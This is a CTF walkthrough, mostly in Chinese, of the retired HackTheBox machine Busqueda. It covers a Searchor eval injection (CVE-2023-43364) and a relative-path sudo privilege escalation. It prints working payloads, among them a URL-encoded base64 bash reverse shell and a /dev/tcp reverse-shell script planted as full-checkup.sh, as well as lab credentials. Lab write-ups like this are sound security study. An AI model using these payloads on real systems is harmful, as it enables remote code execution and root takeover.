 # Busqueda@HTB Retired Machine[Linux][Easy]
> $whoami 
> VV1N

![image](https://hackmd.io/_uploads/Sk94Mnu1xx.png)
CVE-2023-43364 Detail
> main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.

HackMD : https://hackmd.io/@han20011222/HyJkGhdJgx

# Contents
[TOC]

# Machine info

Busqueda 是一台簡單難度的 Linux 機器，需要利用 Python 模組中存在的命令注入漏洞。透過利用此漏洞，我們獲得了該機器的使用者級存取權限。為了將權限提升到 root 權限，我們在 Git 設定檔中發現了一些憑證，這些憑證允許我們登入本機 Gitea 服務。此外，我們也發現特定使用者可以以 root 權限執行系統檢查腳本。透過利用此腳本，我們列舉了 Docker 容器，從而取得了管理員使用者 Gitea 帳戶的憑證。進一步分析 Git 儲存庫中系統檢查腳本的原始程式碼，我們發現了一種利用相對路徑引用的方法，從而授予我們以 root 權限執行遠端程式碼執行 (RCE) 的能力。

# 1. Port Scan
- Running rustscan `sudo rustscan -a 10.10.11.208 -- -sC - sS -sV`
![image](https://hackmd.io/_uploads/HkpYd2Okge.png)
![image](https://hackmd.io/_uploads/Hyb-s3O1ex.png)
可以發現這台靶機開了 `22/tcp port`, `80/tcp port` 且 80 port 會重新導向至 `searcher.htb`
- 設定重新導向 Redirect to searcher.htb `sudo vim /etc/hosts` 
![image](https://hackmd.io/_uploads/Hy1Ss2uJel.png)



# 2. Recon
- dirsearch 放在背景跑
![image](https://hackmd.io/_uploads/r16v5EKzgx.png)
- 進入網頁可以發現他是一個可以選擇搜尋引擎的網站
![image](https://hackmd.io/_uploads/HkTRs2dyle.png)
![image](https://hackmd.io/_uploads/r1MGpdtzlg.png)
    ```
    使用 Searcher 搜尋任何內容！功能涵蓋社群媒體平台、百科全書、問答網站等等。我們提供豐富的搜尋引擎，包括 YouTube、Google、DuckDuckGo、eBay 以及其他各種平台，供您選擇。

    使用我們的搜尋引擎，您可以監控社交網路和網路上所有公開的社交提及。這使您能夠在一個易於使用的控制面板中快速衡量和追蹤人們對您的公司、品牌、產品或服務的評價。我們的平台簡化了您對線上狀態的概覽，從而節省您的時間並增強您的追蹤效果。

    開始使用：
    1. 選擇您想要使用的引擎。
    2. 輸入您想要搜尋的查詢。
    3. 最後，點選「搜尋」按鈕提交查詢。

    如果您想自動重定向，可以勾選複選框。然後，您將自動重新導向到所選引擎，並顯示您搜尋的查詢結果。否則，您將獲得搜尋結果的 URL，您可以隨意使用。
    ```
- 我們設定我們的搜尋引擎 Google 然後 Query 填入 hello
![image](https://hackmd.io/_uploads/rkI9p4tGll.png)

- 順便用burp 攔看看 可以看到 engine=...&query=...
![image](https://hackmd.io/_uploads/ByFjJcqMgg.png)
![image](https://hackmd.io/_uploads/B1uCpVtzeg.png)

# 3. Exploitation
- 查了一下 Searchor 2.4.0 CVE 可以發現有eval function問題
![image](https://hackmd.io/_uploads/B1S57Z9zlx.png)

- 猜測這個位置 code 是這樣 (如果輸入的 query 沒經過驗證就會非常危險)
    ```code
    url = eval(f"Engine.{engine}.search('{query}')")
    ```
- 原理分析
![image](https://hackmd.io/_uploads/BkXGrqcMle.png)

- url 編碼
`engine=Google&query=hello%27%29%2B__import__%28%27os%27%29.system%28%27whoami%27%29%23`
![image](https://hackmd.io/_uploads/B1YvQ9qGge.png)
![image](https://hackmd.io/_uploads/SkKMtrVXgl.png)

### Payload : 
- Reverse Shell : `query = "Hello')+ str(__import__('os').system('echo <base64_payload>|base64 -d|bash'))#"`
- Url encode （echo "{Reverse shell}" | base64）
`engine=Google&query=Hello%27%29%2B%20str%28__import__%28%27os%27%29.system%28%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQo%3D%7Cbase64%20-d%7Cbash%27%29%29%23`
![image](https://hackmd.io/_uploads/rJsuV95Ggg.png)
- 成功拿到 Shell (TTY shell)
![image](https://hackmd.io/_uploads/H1PVDqqfll.png)

- cd .. 出去找到 home 目錄 (home 在 Linux 系統中，/home 目錄是每個「使用者帳號」的家目錄所在的地方。這裡會儲存使用者的個人檔案、設定、下載資料等) 發現第一組 flag
![image](https://hackmd.io/_uploads/HkYD8bqGeg.png)


# 4. Privilege Escalation
- 根據題目提醒 `為了將權限提升到 root 權限，我們在 Git 設定檔中發現了一些憑證，這些憑證允許我們登入本機 Gitea 服務。`
![image](https://hackmd.io/_uploads/SJbZNMEQgl.png)

- 描述遠端主機的設定（origin 是預設名稱）發現明文密碼洩漏 `jh1usoih2bkjaspwe92` 跟 Gitea 服務
![image](https://hackmd.io/_uploads/BywXNGNXxl.png)

- sudo -l 使用剛剛拿到的明文密碼
`(root) /usr/bin/python3 /opt/scripts/system-checkup.py *`
![image](https://hackmd.io/_uploads/ryV1if4Qlg.png)
當我們使用 svc 使用者 使用 sudo /usr/bin/python3 /opt/scripts/system-checkup.py * 這一行等同於 root 在跑

- 確定 svc 使用者帳密後直接 ssh svc@10.10.11.128  
![image](https://hackmd.io/_uploads/HkZyAMVmxe.png)
run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *`
![image](https://hackmd.io/_uploads/Hy3ImQVXgg.png)
        這邊有寫到他的三個模式
    ```
    docker-ps     : List running docker containers
    docker-inspect : Inpect a certain docker container
    full-checkup  : Run a full system checkup
    ```
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps`
![image](https://hackmd.io/_uploads/rkATNXN7xe.png)
（可以看到一個 Gitea Git 服務，跟一個 mysql_db）

- Docker-inspect 
![image](https://hackmd.io/_uploads/HkqRlVVQxg.png)
![image](https://hackmd.io/_uploads/ByvlbNEQle.png)

    這支 script 的 docker-inspect 模式需要兩個參數：
	1.	format：Go template 或 json / {{json .}}
	2.	container_name：你要查的容器（此例為 gitea）

    ![image](https://hackmd.io/_uploads/rkPezENQlg.png)

- `svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq`
docker-inspect：告訴腳本你要執行 inspect 功能
{{json .}}：請腳本幫你格式化 docker inspect 的結果為 JSON
gitea：容器名稱
jq 是一個 CLI JSON 處理工具，用來把輸出的 JSON：
    -自動排版（加換行、縮排）
    -提供你 .key .Config.Env[] 這種語法來篩選欄位
這邊沒指定進一步處理的話，它會直接幫你 美化列印整個 JSON。
![image](https://hackmd.io/_uploads/BJp1NNN7el.png)
    ...
![image](https://hackmd.io/_uploads/ryNG44Emgx.png)
(未使用 jq)
- 發現有 db PASSWD=`yuiu1hoiu4i5ho1uh`
![image](https://hackmd.io/_uploads/rk3FV4VQll.png)



- 把Gitea 服務 gitea.searcher.htb 加到 /etc/hosts 下
![image](https://hackmd.io/_uploads/SyJuJ74Qgg.png)
![image](https://hackmd.io/_uploads/HyGZgXVmlg.png)
![image](https://hackmd.io/_uploads/SkPlW7V7ge.png)
![image](https://hackmd.io/_uploads/BJqXbQNXxx.png)
- 花現一個 administrator@gitea.searcher.htb 帳戶
![image](https://hackmd.io/_uploads/BkjOfXN7lg.png)

- 利用剛剛找到的db PASSWD 登入 administrator
![image](https://hackmd.io/_uploads/B1zFH4EXee.png)
![image](https://hackmd.io/_uploads/ry6nBVEQel.png)
只要執行 sudo /usr/bin/python3 /opt/scripts/system-checkup.py <參數>，就能以 root 權限執行這支腳本，因為該使用者具有對此腳本的 sudo 執行權限。
(這裡是 svc，但系統管理員設定了 sudo 權限，允許可以以 root 身份執行 /usr/bin/python3 /opt/scripts/system-checkup.py，這就是為什麼你能跑它，雖然你不是 root)
![image](https://hackmd.io/_uploads/By5FDVV7ll.png)

- 所以我們詳細來看看 system-checkup.py
    ```python=
    #!/bin/bash
    import subprocess
    import sys

    actions = ['full-checkup', 'docker-ps','docker-inspect']

    def run_command(arg_list):
        r = subprocess.run(arg_list, capture_output=True)
        if r.stderr:
            output = r.stderr.decode()
        else:
            output = r.stdout.decode()

        return output


    def process_action(action):
        if action == 'docker-inspect':
            try:
                _format = sys.argv[2]
                if len(_format) == 0:
                    print(f"Format can't be empty")
                    exit(1)
                container = sys.argv[3]
                arg_list = ['docker', 'inspect', '--format', _format, container]
                print(run_command(arg_list)) 

            except IndexError:
                print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
                exit(1)

            except Exception as e:
                print('Something went wrong')
                exit(1)

        elif action == 'docker-ps':
            try:
                arg_list = ['docker', 'ps']
                print(run_command(arg_list)) 

            except:
                print('Something went wrong')
                exit(1)

        elif action == 'full-checkup':
            try:
                arg_list = ['./full-checkup.sh']
                print(run_command(arg_list))
                print('[+] Done!')
            except:
                print('Something went wrong')
                exit(1)

    if __name__ == '__main__':

        try:
            action = sys.argv[1]
            if action in actions:
                process_action(action)
            else:
                raise IndexError

        except IndexError:
            print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
            print('')
            print('     docker-ps     : List running docker containers')
            print('     docker-inspect : Inpect a certain docker container')
            print('     full-checkup  : Run a full system checkup')
            print('')
            exit(1)
    ```
- 可以知道當我們是執行 full-checkup 選項時是以 Root 權限執行
![image](https://hackmd.io/_uploads/B1FqnVE7ex.png)
    
    ```py=
    elif action == 'full-checkup':
            try:
                arg_list = ['./full-checkup.sh']
                print(run_command(arg_list))
                print('[+] Done!')
            except:
                print('Something went wrong')
                exit(1)
    ```
    可以看到裡面有 ./full-checkup.sh
    ![image](https://hackmd.io/_uploads/SyxgiVV7xe.png)
    如果 svc 使用者可以控制 full-checkup.sh（例如修改或創建這個檔案），那麼當執行 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup 時，我們的惡意指令就會以 root 權限被執行，達成提權。
- owner（root）有讀、寫、執行權限; 其他人只可以執行所以不能改
![image](https://hackmd.io/_uploads/ryUcpEE7gl.png)
但我們可以知道`/opt/scripts/full-checkup.sh` 程式中並非是使用這種絕對路徑來寫執行 full-checkup.sh 的方式

- 我們在tmp裡面構造一個惡意 `payload` 打 Reverse shell 回來
![image](https://hackmd.io/_uploads/SJnFfrEQxg.png)
(發現不奏效)
問題點：
	1.	缺少 shebang（#!/bin/bash）：
	•	執行 full-checkup.sh 時，系統會不知道要用哪個 shell 解讀它
	•	雖然大多數情況會 fallback 到 /bin/sh，但有些版本的 /bin/sh 不支援 bash -i 或 >& 這種語法
	2.	\>、>&、0>&1 沒加 escape 處理，在某些情況可能被 shell 攔截或解釋成錯誤語法（尤其在 sudo subprocess 中）
	3.	你沒有用 -e（啟用 escape）或加 \n，導致整個 payload 是單行的，也沒顯示清楚錯誤，debug 很難
- 回到 /opt/scripts 路徑內確實可以執行起來
![image](https://hackmd.io/_uploads/H1HbXB4Qgg.png)

### Payload
`echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.2/12345 0>&1' > /tmp/full-checkup.sh`
![image](https://hackmd.io/_uploads/ryM9vrNmge.png)
`nc -lvnp 12345`
![image](https://hackmd.io/_uploads/SyGq8HV7el.png)



### 成功 Pwn 掉了
這是一個典型的 sudo 權限濫用 + 相對路徑執行造成的本地提權漏洞：
>由於 system-checkup.py 允許 svc 以 root 執行，且其中的 full-checkup 選項執行的是相對路徑 ./full-checkup.sh，攻擊者可以在可寫目錄（如 /tmp）放置同名惡意腳本，成功以 root 執行任意指令並獲得提權。
![image](https://hackmd.io/_uploads/S1yLIHVXgg.png)
